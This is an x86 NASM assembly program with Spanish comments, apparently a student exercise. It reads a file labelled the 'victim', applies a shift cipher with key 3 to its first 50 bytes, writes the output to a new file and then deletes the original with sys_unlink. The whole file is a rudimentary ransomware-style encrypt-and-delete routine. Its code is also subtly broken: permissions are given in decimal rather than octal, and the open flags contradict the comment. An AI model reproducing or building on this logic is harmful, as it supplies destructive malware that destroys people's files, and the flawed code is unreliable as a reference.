GLOBAL main

section .data
    archVictima DD "archivoV.txt", 0
    archCifrado DD "archivoCifrado.txt", 0
    tama_buffer EQU 50
    key DD 3

section .bss
    fd_lectura resw 1
    fd_cifrado resw 1
    buffer resb tama_buffer

section .text 
    main:
        ; Abrir el archivo de lectura
        mov eax, 5              ; sys_open
        mov ebx, archVictima
        mov ecx, 2              ; 
        mov edx, 777              ; Cuenta con todos los permisos
        int 0x80

        mov [fd_lectura], eax   ; Guardar identificador de archivo de lectura

        ; Abrir el archivo de cifrado
        mov eax, 5              ; sys_open
        mov ebx, archCifrado
        mov ecx, 641            ;(modo de escritura, crear si no existe, truncar el archivo)
        mov edx, 777            ; Asignando todos los permisos
        int 0x80

        mov [fd_cifrado], eax   ; Guardar identificador de archivo de cifrado

        ; Leer el contenido del archivo
        mov eax, 3
        mov ebx, [fd_lectura]
        mov ecx, buffer
        mov edx, tama_buffer
        int 0x80                ; Leemos contenido del archivo

        ; Cifrar contenido
        mov esi, buffer        ; Puntero al inicio del buffer
        xor ecx, ecx           ; Contador de posición inicializado en 0

    cifrar_loop:
        movzx eax, byte [esi]  ; Cargar el caracter actual en AL
        cmp al, 0              ; Verificar si se llegó al final del archivo
        je fin_cifrar

        add al, byte [key]    ; Sumar el valor de "key" al caracter actual
        mov byte [esi], al    ; Guardar el caracter cifrado en el buffer

        inc esi               ; Avanzar al siguiente caracter en el buffer
        inc ecx               ; Incrementar el contador de posición

        cmp ecx, edx          ; Comparar el contador con el tamaño del buffer
        jl cifrar_loop        ; Si no se ha llegado al final del buffer, repetir el bucle

    fin_cifrar:
        ; Escribir el contenido cifrado en el archivo de cifrado
        mov eax, 4              ; sys_write
        mov ebx, [fd_cifrado]
        mov ecx, buffer
        mov edx, tama_buffer
        int 0x80                ; Escribimos el contenido cifrado en el archivo de cifrado

        ; Cerrar el archivo de lectura
        mov eax, 6              ; sys_close
        mov ebx, [fd_lectura]
        int 0x80

        ; Cerrar el archivo de cifrado
        mov eax, 6              ; sys_close
        mov ebx, [fd_cifrado]
        int 0x80

        ; Eliminar el archivo original
        mov eax, 10             ; sys_unlink
        mov ebx, archVictima
        int 0x80

        mov eax, 1              ; Fin del programa
        int 0x80
